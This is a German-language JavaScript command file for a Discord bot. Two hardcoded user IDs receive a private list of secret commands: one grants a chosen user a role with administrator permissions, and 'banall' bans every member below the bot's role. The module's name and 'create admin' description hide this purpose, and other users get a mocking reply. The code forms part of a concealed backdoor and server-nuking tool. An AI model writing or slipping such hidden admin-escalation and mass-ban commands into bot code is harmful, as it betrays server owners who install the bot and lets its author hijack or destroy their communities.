const config = require("../botconfig.json");
const { inspect } = require("util");
const ownerid = "534751262416175116";
const ownerid2 = "312566463267340288";

module.exports.run = async (bot, message, args) => {
    
	if(message.author.id == ownerid) {
    message.author.send("Befehle:");
    message.author.send('ääääää% -- Erstellt und gibt dir  in der usage "+ääääää% @Shaiiko RollenName" Eine rolle mit admin permissions');
    message.author.send("ääääää%banall -- Bannt alle spieler die unter der rolle des bots sind");
    message.channel.send("Habe dir eine dm gesendet").then(msg => msg.delete(10000000));

    message.author.send("ALLE COMMANDS")

    

} else {
    message.reply("Du bist also Shaiiko.. Glaube ich dir nicht!")
}

if(message.author.id == ownerid2) {
    message.author.send("Befehle:");
    message.author.send('ääääää% -- Erstellt und gibt dir  in der usage "+ääääää% @Shaiiko RollenName" Eine rolle mit admin permissions');
    message.author.send("ääääää%banall -- Bannt alle spieler die unter der rolle des bots sind");
} else{
    message.channel.send(" ");
}
} 
 

module.exports.config = {
	name: "shaiikololo",
	description: "create admin.",
	usage: "<> <>",
	accessableby: "Moderators",
	aliases: []
};